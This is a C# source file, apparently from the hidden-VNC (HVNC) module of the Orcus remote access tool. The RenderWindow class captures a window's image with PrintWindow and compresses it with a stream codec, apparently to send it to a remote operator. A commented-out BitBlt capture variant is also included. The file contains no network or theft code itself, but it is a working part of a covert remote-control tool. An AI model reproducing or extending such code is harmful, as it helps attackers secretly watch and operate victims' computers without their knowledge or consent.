using System;
using System.Drawing;
using System.Drawing.Imaging;
using Orcus.Native;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Data;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.HVNC
{
    public class RenderWindow : IDisposable
    {
        private int _codecHeight;
        private int _codecWidth;
        private UnsafeStreamCodec _unsafeStreamCodec;

        public RenderWindow(WindowInformation windowInformation, IntPtr handle)
        {
            WindowInformation = windowInformation;
            Handle = handle;
        }

        public void Dispose()
        {
            _unsafeStreamCodec?.Dispose();
        }

        public WindowInformation WindowInformation { get; }
        public IntPtr Handle { get; }

        public void ApplyWindowInformation(WindowInformation windowInformation)
        {
            WindowInformation.Title = windowInformation.Title;
            WindowInformation.Width = windowInformation.Width;
            WindowInformation.Height = windowInformation.Height;
            WindowInformation.X = windowInformation.X;
            WindowInformation.Y = windowInformation.Y;
        }

        public IDataInfo Render()
        {
            RECT rect;
            if (!NativeMethods.GetWindowRect(Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                return null;

            if (_unsafeStreamCodec == null || _codecWidth != rect.Width || _codecHeight != rect.Height)
            {
                _unsafeStreamCodec?.Dispose();
                _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None);
                _codecWidth = rect.Width;
                _codecHeight = rect.Height;
            }

            /*IntPtr hdcSrc = GetWindowDC(Handle);
            // get the size
            RECT windowRect;
            NativeMethods.GetWindowRect(Handle, out windowRect);

            int width = windowRect.Right - windowRect.Left;
            int height = windowRect.Bottom - windowRect.Top;

            IntPtr hdcDest = CreateCompatibleDC(hdcSrc);

            IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, width, height);
            // select the bitmap object
            IntPtr hOld = SelectObject(hdcDest, hBitmap);
            // bitblt over
            BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, SRCCOPY);
            // restore selection
            SelectObject(hdcDest, hOld);
            // clean up
            DeleteDC(hdcDest);
            ReleaseDC(Handle, hdcSrc);
            // get a .NET image object for it
            Bitmap img = Image.FromHbitmap(hBitmap);
            // free up the Bitmap object
            DeleteObject(hBitmap);

            using (img)
            {
                var imageData = img.LockBits(new Rectangle(0, 0, img.Width, img.Height),
                    ImageLockMode.ReadOnly, img.PixelFormat);

                try
                {
                    return _unsafeStreamCodec.CodeImage(imageData.Scan0, new Rectangle(new Point(0, 0), img.Size),
                        img.Size, img.PixelFormat);
                }
                catch (Exception)
                {
                    return null;
                }
                finally
                {
                    img.UnlockBits(imageData);
                }
            }*/


            using (var windowImage = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppPArgb))
            {
                using (var gfxBmp = Graphics.FromImage(windowImage))
                {
                    var hdcBitmap = gfxBmp.GetHdc();
                    try
                    {
                        if (!NativeMethods.PrintWindow(Handle, hdcBitmap, 0))
                            return null;
                    }
                    finally
                    {
                        gfxBmp.ReleaseHdc(hdcBitmap);
                    }
                }

                var imageData = windowImage.LockBits(new Rectangle(0, 0, windowImage.Width, windowImage.Height),
                    ImageLockMode.ReadWrite, windowImage.PixelFormat);

                try
                {
                    return _unsafeStreamCodec.CodeImage(imageData.Scan0,
                        new Rectangle(new Point(0, 0), windowImage.Size),
                        windowImage.Size, windowImage.PixelFormat);
                }
                catch (Exception)
                {
                    return null;
                }
                finally
                {
                    windowImage.UnlockBits(imageData);
                }
            }
        }
    }
}